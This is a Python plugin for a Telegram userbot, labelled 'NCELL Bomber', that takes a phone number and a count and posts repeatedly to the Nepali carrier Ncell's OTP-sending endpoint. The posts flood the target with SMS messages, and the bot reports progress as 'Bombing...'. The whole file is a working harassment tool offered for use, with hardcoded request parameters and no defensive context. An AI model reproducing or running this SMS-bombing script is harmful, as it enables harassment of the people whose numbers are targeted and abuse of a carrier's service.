"""NCELL Bomber custom plugin by @scifidemon
Format .bombncell [phone number]"""
import asyncio
import requests
from userbot.utils import admin_cmd
from time import sleep
@borg.on(admin_cmd("ncell (.*)"))
async def _(event):
    num=0
    n=0
    input_str = event.pattern_match.group(1)
    if input_str:
        num = int(input_str[:10])
        n = int(input_str[11:])
    else:
        await event.edit("Enter a number!")
        return
    paramss={'wms':"e1uzvl3s3hntx4454dfvmn55","TS01a172b1":"018487e1530a540e474e0137e23b284713af2737f277635c2da93bf07dc84da5910b0d04ff7d8c23565466793befeb88e9d243d325e25e85b563e176ece81ab22d98133d4f","ws":'CRBT','type':'SEND_OTP','promo':'DWN','cattype':'RB','cid':'104061','tmpl':'22','mobile':num}
    await event.edit("`Bombing....`")
    for i in range (n):
        if i%5==0:
            requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
            await event.edit(f"`Bombing... {i}`")
            sleep(1)
        else:
            requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
            await event.edit(f"`Bombing... {i}`")
    await event.edit(f"`Bombed {n} SMS to {num}`")

    


